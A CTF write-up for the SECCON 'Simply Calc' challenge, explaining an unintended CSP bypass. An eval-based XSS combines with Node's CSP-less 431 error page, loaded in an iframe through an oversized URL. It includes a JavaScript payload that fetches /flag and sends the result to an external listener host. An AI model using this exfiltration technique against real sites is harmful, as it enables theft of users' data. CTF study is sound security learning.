---
title: "[Simply Calc] - SECCON Quals"
tags:
  - CTF
  - Write-up
  - csp-bypass
  - client-side
  - service-worker
categories:
  - CTF
  - Write Up
---
![[Screenshot 2024-01-19 at 23.06.45.png]]
# Prologue
SECCON CTF is International yearly competition. The finals will take into Japan. 

![[simple-calc.tar.gz]]
# Write Up
## TL;DR Solution
### Un-intended

The un-intended version of this challenge is the player by creating a iframe with very long url and cause `431` error. The default of that error page in nodejs has a CSP-less, causing player able to bypass the intended CSP. 
### Intended

TODO

## Detailed Explanation

### Un-intended

We were given the full source code for this challenge.
![[Screenshot 2024-01-19 at 23.23.33.png]]

As we can see in the `./challenge/src/static/js/index.js`, player able to control the query string of `expr`, and immediately `eval`-ed by the app. 
```js
// ./challenge/src/static/js/index.js
const params = new URLSearchParams(location.search);
const result = eval(params.get('expr'));
document.getElementById('result').innerText = result.toString();
```

By using `/?expr=alert(document.origin)` and we got a free-xss
![[Screenshot 2024-01-19 at 23.29.30.png]]

But the problem arise when we attempt to access the `/flag`.
```js
// ./challenge/src/index.js
// 8< -- Snip -- >8
app.get('/flag', (req, res) => {
  if (req.cookies.token !== ADMIN_TOKEN || !req.get('X-FLAG')) {
    return res.send('No flag for you!');
  }
  return res.send(FLAG);
});
// 8< -- Snip -- >8
```

As we can see, the CSP is very strict. The challenge CSP has `default-src` and the value is only at `http://localhost:3000/js/index.js`. So, every resources request we make outside that csp will be restricted.
![[Screenshot 2024-01-19 at 23.43.34.png]]

Luckily, In nodejs, the default page for error `431` has CSP-less.
![[Screenshot 2024-01-19 at 23.19.18.png]]

The idea is, we make an iframe with very-very long url to trigger the `413` error. And after that, we will execute JS inside the iframe context.

```js
_=document.createElement('iframe');
_.src=`http://localhost:3000/js/index.js?${"A".repeat(99999)}`;
document.body.appendChild(_);
// give a time to DOM to finish the iframe load
setTimeout(function(){
    _.contentWindow.fetch('/flag', {mode:"same-origin",headers: {"X-FLAG":"nice"}}).then((r)=>r.text()).then((r)=>{location=`http://host.docker.internal:1234/?${r}`});
}, 1000);
```

Send to the bot and we will able to get the flag
![[Screenshot 2024-01-20 at 00.09.21.png]]

![[Screenshot 2024-01-20 at 00.10.07.png]]
### Intended

TODO


# Epilogue